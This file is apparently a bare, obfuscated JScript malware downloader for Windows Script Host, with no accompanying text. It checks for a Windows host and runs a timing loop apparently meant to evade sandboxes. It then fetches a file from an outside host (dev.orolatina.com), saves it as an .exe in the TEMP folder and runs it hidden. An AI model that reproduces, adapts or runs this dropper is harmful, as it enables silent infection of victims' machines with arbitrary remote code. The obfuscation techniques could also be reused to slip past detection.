var _WY = false;
var _DO = "CreateObject";
var _M0 = function _GC() {return WScript[_DO]("WScript"+".Shell");}(), _UN = 11;
var _D = "MSXML2.XMLHTTP";
var _H = 2123213;
var _ZM = 0;
function _N(_G){_M0["Run"](_G, _ZM, _ZM);};
function _HX(){return _D + "";};
function _Z(_HP, _UM){_ZM = _ZM * 1; return _HP - _UM;};
function _J(){return _DO;};
/*@cc_on
  @if (@_win32 || @_win64)
    _WY = true;
  @end
@*/
if (_WY)
{
var _P = "";
function _B(){return 22;};
var _F = 0; var _WI = 0;
function _Y()
{
var _Y0 = new this["Date"]();
var _CW = _Y0["getUTCMilliseconds"]();
WScript["Sleep"](_B());
var _Y0 = new this["Date"]();
var _UY = _Y0["getUTCMilliseconds"]();
WScript["Sleep"](_B());
var _Y0 = new this["Date"]();
var _HC = _Y0["getUTCMilliseconds"]();
var _F = "_YE";
_F = _Z(_UY, _CW);
var _WI = "_R";
_WI = _Z(_HC, _UY);
_P = "open";
return _Z(_F, _WI);
}
var _X = false;
var _K = false;
for (var _OB = _ZM; _OB < _B() * 1; _OB++){if (_Y() != _ZM){
_X = true; 
_WI = "31" + 11 * _F + _WI; 
_K = true; 
break;
}}
function _DI() {return ((_X == true) && (_X == _K)) ? 1 : _ZM;};
if (_X && _DI() && _K){
function _C() {return _M0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "E3rFFqqkr.ex" + "e";};
 _PW = _HX();
 _IN = WScript[_DO](_PW);
 var _W = 1;
 while (_W){
try {
	if (_W == 1)
	{
		_IN[_P]("GET", "http://dev.orolatina.com/s3isk", false);
		_IN["send"]();
		_U = "Sleep";
	}
	WScript[_U](_B() + 120); 
	if (_IN["readystate"] < 2 * 2) continue;
	_W = _ZM;
	function _TA(_DS) {var _M = (1, 2, 3, 4, 5, _DS); return _M;};
	_MO = WScript[_J()]("ADODB.Stream");
	_PW = _MO;
	_PW[_P]();
	_PW["type"] = _TA(1);
	_PW["write"](_IN["ResponseBody"]);
	_MO["position"] = _TA(_ZM);
	_PW["Save" + "ToFile"](_C(), 2);
	_MO["cl"+"ose"]();
	_YW = _C();
	_N(_YW);
} catch(_JW){};
}
}
}

